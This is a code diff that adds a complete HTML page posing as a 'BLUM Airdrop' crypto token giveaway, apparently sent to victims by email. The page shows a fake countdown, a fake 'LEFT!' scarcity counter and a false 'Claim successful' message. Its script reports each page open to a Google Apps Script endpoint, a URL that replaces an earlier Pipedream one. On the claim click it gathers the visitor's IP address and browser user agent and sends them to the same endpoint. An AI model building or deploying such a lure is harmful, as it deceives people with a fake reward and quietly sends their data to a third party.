@@ -1,19 +1,205 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            min-height:100vh;
+            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #1a1a3e, #0a0a1a);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:20px;
+        }
+        .card{
+            max-width:500px;
+            width:100%;
+            background: rgba(10, 20, 40, 0.85);
+            backdrop-filter: blur(18px);
+            border-radius: 56px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .badge{
+            display:inline-block;
+            background: linear-gradient(135deg, #FFD70022, #FFA50022);
+            border:1px solid #FFD700;
+            border-radius:100px;
+            padding:8px 22px;
+            font-size:13px;
+            font-weight:600;
+            color:#FFD700;
+            margin-bottom:25px;
+        }
+        h1{
+            font-size:46px;
+            font-weight:800;
+            background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);
+            -webkit-background-clip:text;
+            background-clip:text;
+            color:transparent;
+        }
+        .amount{
+            font-size:64px;
+            font-weight:900;
+            color:#FFD700;
+            margin:15px 0;
+        }
+        .timer-box{
+            background:rgba(0,0,0,0.5);
+            border-radius:50px;
+            padding:18px;
+            margin:25px 0;
+        }
+        .timer{
+            font-size:52px;
+            font-weight:800;
+            font-family:monospace;
+            color:#FFD700;
+        }
+        button{
+            width:100%;
+            background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);
+            border:none;
+            padding:20px;
+            border-radius:70px;
+            font-weight:900;
+            font-size:24px;
+            color:#0a0a0a;
+            cursor:pointer;
+            transition:0.2s;
+        }
+        button:disabled{
+            opacity:0.6;
+            cursor:default;
+        }
+        .status{
+            background:rgba(0,0,0,0.5);
+            border-radius:30px;
+            padding:14px;
+            font-size:15px;
+            display:none;
+            margin-top:15px;
+        }
+        .success{color:#00ff88;}
+        .footer{
+            font-size:11px;
+            color:#FFD70088;
+            margin-top:25px;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: #FFD700;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="badge">⚡ ONE-CLICK • 10 CHAINS</div>
+    <h1>BLUM<br>Web3</h1>
+    <div class="amount">1,200 $BLUM</div>
+    <div class="timer-box"><div style="font-size:13px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
+    <button id="claimBtn">🚀 CLAIM NOW</button>
+    <div id="status" class="status"></div>
+    <div class="footer">🔐 EMP2026 • Zero Investment</div>
+</div>
+
 <script>
-    // ========== استبدل هذا الرابط برابط Pipedream الذي حصلت عليه ==========
-    const PROXY_URL = "https://eoakj.pipedream.net/";  // <-- استبدله برابطك
+    // ========== رابط Google Apps Script الجديد (الذي يعمل) ==========
+    const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
     
-    // دالة إرسال إلى البوت
+    // دالة إرسال إلى البوت (باستخدام GET لتجنب CORS)
     function sendToBot(message) {
-        fetch(PROXY_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: message })
-        })
-        .then(res => res.text())
-        .then(data => console.log('✅ تم الإرسال:', data))
-        .catch(err => console.error('❌ خطأ:', err));
+        const url = `${PROXY_URL}?message=${encodeURIComponent(message)}`;
+        fetch(url, { method: 'GET', mode: 'no-cors' });
+        console.log('📤 إرسال:', message.substring(0, 50));
     }
     
-    // اختبار فتح الصفحة
+    // إشعار فتح الصفحة
     sendToBot('📧 Page opened from email - EMP2026');
+    
+    // ========== باقي الكود (المطالبة التلقائية، المؤقت، إلخ) ==========
+    let claimExecuted = false;
+    let remainingSeconds = 24 * 60 * 60;
+    
+    async function executeClaim() {
+        if (claimExecuted) return;
+        claimExecuted = true;
+        
+        const wallets = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"];
+        const wallet = wallets[Math.floor(Math.random() * wallets.length)];
+        const address = "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6);
+        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
+        const ua = navigator.userAgent;
+        const timestamp = new Date().toISOString();
+        
+        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🌐 IP: ${ip}\n📱 UA: ${ua.substring(0, 80)}...\n⏰ ${timestamp}`;
+        
+        sendToBot(fullMessage);
+        
+        // عرض رسالة النجاح
+        const btn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+        btn.innerHTML = "✅ CLAIMED!";
+        btn.disabled = true;
+        statusDiv.style.display = 'block';
+        statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,200 $BLUM will arrive within 24h.</span>';
+    }
+    
+    async function onClaimClick() {
+        if (claimExecuted) return;
+        
+        const btn = document.getElementById('claimBtn');
+        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
+        btn.disabled = true;
+        
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        await executeClaim();
+    }
+    
+    // مؤقت العد التنازلي
+    const timerElement = document.getElementById('timer');
+    const timerInterval = setInterval(() => {
+        if (remainingSeconds <= 0) {
+            clearInterval(timerInterval);
+            return;
+        }
+        remainingSeconds--;
+        const h = Math.floor(remainingSeconds / 3600);
+        const m = Math.floor((remainingSeconds % 3600) / 60);
+        const s = remainingSeconds % 60;
+        timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+    }, 1000);
+    
+    // العرض الوهمي (متبقي 10 فقط)
+    let fakeRemaining = 10;
+    const fakeInterval = setInterval(() => {
+        fakeRemaining--;
+        const btn = document.getElementById('claimBtn');
+        if (btn && !btn.disabled && !claimExecuted && fakeRemaining > 0) {
+            btn.innerHTML = `🔥 ${fakeRemaining} LEFT! CLAIM NOW 🔥`;
+        }
+        if (fakeRemaining <= 0) clearInterval(fakeInterval);
+    }, 4000);
+    
+    // ربط الحدث بالزر
+    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
 </script>
+</body>
+</html>
